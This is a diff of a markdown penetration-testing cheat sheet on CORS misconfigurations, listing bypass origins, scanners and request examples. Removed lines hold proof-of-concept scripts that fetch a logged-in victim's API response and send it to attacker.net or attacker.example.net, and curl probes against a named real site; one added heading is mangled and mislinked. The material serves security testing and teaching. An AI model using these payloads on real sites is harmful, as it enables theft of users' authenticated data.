@@ -1592,23 +1592,38 @@ Subject: Email Forgery due to missing SPF
 ---
 # CORS (Cross-Origin Resource Sharing) Security Testing Guide
 
-## 1. Testing CORS Misconfigurations (Origin Reflection)
+## 1. Testing CORS Misconfigurations (Origin Reflection) | https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
 
-### Steps to Check CORS Vulnerability:
-1. Origin Reflection - Add an `Origin` header.
+**Common vulnerable parameters:**
 
-```powershell
-GET /endpoint HTTP/1.1
-Host: victim.example.com
-Origin: https://evil.com
-Cookie: sessionid=... 
+| Parameter | Description |
+|-----------|-------------|
+| `Origin` | Header used to validate request source |
+| `Access-Control-Allow-Origin` | Response header that defines allowed origins |
+| `Access-Control-Allow-Credentials` | Enables cookies/auth headers in cross-origin requests |
+| `Access-Control-Allow-Methods` | Allowed HTTP methods (GET, POST, etc.) |
+| `Access-Control-Allow-Headers` | Allowed custom headers |
+| `Access-Control-Max-Age` | Caching duration for preflight responses |
 
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true 
+---### 🔥 Bypass Techniques (Adapted from your GitHub repos)
 
-{"[private API key]"}
-```
+| Technique | Description | Example |
+|----------|-------------|---------|
+| **Reflected Origin** | Server echoes attacker’s `Origin` | `Origin: https://evil.com` |
+| **Regex Bypass** | Exploit loose regex like `.*trusted.com` | `Origin: https://trusted.com.evil.com` |
+| **Null Origin** | Use sandboxed iframe or data URI | `Origin: null` |
+| **Subdomain Takeover** | Host payload on trusted subdomain | `Origin: https://sub.trusted.com` | `Origin: http://sub.trusted.com` |
+| **Credentialed Requests** | Exploit `Access-Control-Allow-Credentials: true` | Combine with reflected origin |
+| **Special Characters** | Use `%`, `@`, `` ` `` to bypass regex | `Origin: https://trusted.com%.evil.com` |
+
+## Tools
+
+* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
+* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
+* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
+* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
+* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
+
 #### Proof Of Concept
 
 This PoC requires that the respective JS script is hosted at `evil.com`
@@ -1651,54 +1666,9 @@ or
      </body>
  </html>
 ```
-
-### Null Origin
-
-#### Vulnerable Implementation
-
-It's possible that the server does not reflect the complete `Origin` header but
-that the `null` origin is allowed. This would look like this in the server's
-response:
-
-```ps1
-GET /endpoint HTTP/1.1
-Host: victim.example.com
-Origin: null
-Cookie: sessionid=... 
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: null
-Access-Control-Allow-Credentials: true 
-
-{"[private API key]"}
-```
-
-#### Proof Of Concept
-
-This can be exploited by putting the attack code into an iframe using the data
-URI scheme. If the data URI scheme is used, the browser will use the `null`
-origin in the request:
-
-```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
-  var req = new XMLHttpRequest();
-  req.onload = reqListener;
-  req.open('get','https://victim.example.com/endpoint',true);
-  req.withCredentials = true;
-  req.send();
-
-  function reqListener() {
-    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
-   };
-</script>"></iframe> 
-```
 ### Wildcard Origin without Credentials
 
-If the server responds with a wildcard origin `*`, **the browser does never send
-the cookies**. However, if the server does not require authentication, it's still
-possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then
-pivot into the internal network and access the server's data without authentication.
+If the server responds with a wildcard origin `*`, **the browser does never send the cookies**. However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication.
 
 ```powershell
 * is the only wildcard origin
@@ -1749,23 +1719,6 @@ Access-Control-Allow-Credentials: true
 
 {"[private API key]"}
 ```
-
-#### Proof of Concept (Example 1)
-
-This PoC requires the respective JS script to be hosted at `evilexample.com`
-
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.example.com/endpoint',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
-```
-
 #### Vulnerable Implementation (Example 2)
 
 In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
@@ -1781,106 +1734,6 @@ Access-Control-Allow-Credentials: true
 
 {"[private API key]"}
 ```
-
-#### Proof of concept (Example 2)
-
-This PoC requires the respective JS script to be hosted at `apiiexample.com`
-
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.example.com/endpoint',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
-```
-3. Vulnerable Implementation (Example 2) - Check for internal applications (same-site origin).
-
-### Insecure Configurations Detection (Response Headers):
-```bash
-curl -s --head 'http://api.view.yahoo.com/api/session/preferences'
-curl -s --head 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: http://view.yahoo.com'
-```
-
-**Vulnerable Headers:**
-```
-Access-Control-Allow-Origin: http://www.evil.com
-Access-Control-Allow-Origin: *
-```
-- `*` means it is allowing all domains (vulnerable setup).
-
-### Exploitation:
-- Look for `embed` parameters in URLs (`embed?url=`).
-- Modify `Origin`, `Pragma`, and `Referer` headers:
-   ```
-   Host: hackerseera.com
-   Origin: http://bing.com
-   Pragma: no-cache
-   Referer: https://bing.com/
-   ```
-- If response shows `Access-Control-Allow-Origin: http://bing.com`, the site is vulnerable.
-- Also, try `Origin: null`.
-
-### Poorly Implemented CORS:
-```bash
-Access-Control-Allow-Origin: https://anysite.com
-Access-Control-Allow-Credentials: true
-```
-- If `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, it's misconfigured but not always exploitable.
-
-### Exploit with Curl:
-```bash
-curl http://any.com -H "Origin: http://www.bing.com" -I
-```
-## Tools
-
-* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
-* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
-* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
-* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
-* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
-
-**Common vulnerable parameters:**
-
-| Parameter | Description |
-|-----------|-------------|
-| `Origin` | Header used to validate request source |
-| `Access-Control-Allow-Origin` | Response header that defines allowed origins |
-| `Access-Control-Allow-Credentials` | Enables cookies/auth headers in cross-origin requests |
-| `Access-Control-Allow-Methods` | Allowed HTTP methods (GET, POST, etc.) |
-| `Access-Control-Allow-Headers` | Allowed custom headers |
-| `Access-Control-Max-Age` | Caching duration for preflight responses |
-
----
-
-### 🔥 Bypass Techniques (Adapted from your GitHub repos)
-
-| Technique | Description | Example |
-|----------|-------------|---------|
-| **Reflected Origin** | Server echoes attacker’s `Origin` | `Origin: https://evil.com` |
-| **Regex Bypass** | Exploit loose regex like `.*trusted.com` | `Origin: https://trusted.com.evil.com` |
-| **Null Origin** | Use sandboxed iframe or data URI | `Origin: null` |
-| **Subdomain Takeover** | Host payload on trusted subdomain | `Origin: https://sub.trusted.com` |
-| **Credentialed Requests** | Exploit `Access-Control-Allow-Credentials: true` | Combine with reflected origin |
-| **Special Characters** | Use `%`, `@`, `` ` `` to bypass regex | `Origin: https://trusted.com%.evil.com` |
-
----
-
-## 🧠 Bypass Logic Summary
-
-### 🔗 From [PortSwigger CORS Lab](https://github.com/Anvesh464/Portswigger-Labs/tree/main/06%20-%20Cross-origin%20resource%20sharing%20(CORS)) and [PayloadsAllTheThings](https://github.com/Anvesh464/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
-
-- **Regex flaws**: `.*trusted.com` matches `eviltrusted.com`
-- **Null origin**: Triggered via sandboxed iframe or `data:` URI
-- **Subdomain trust**: Exploitable if attacker controls `*.trusted.com`
-- **Credential leaks**: Only exploitable if `Access-Control-Allow-Credentials: true` is set
-
----
------ 
-
 # CRLF Injection
 
 ## Methodology
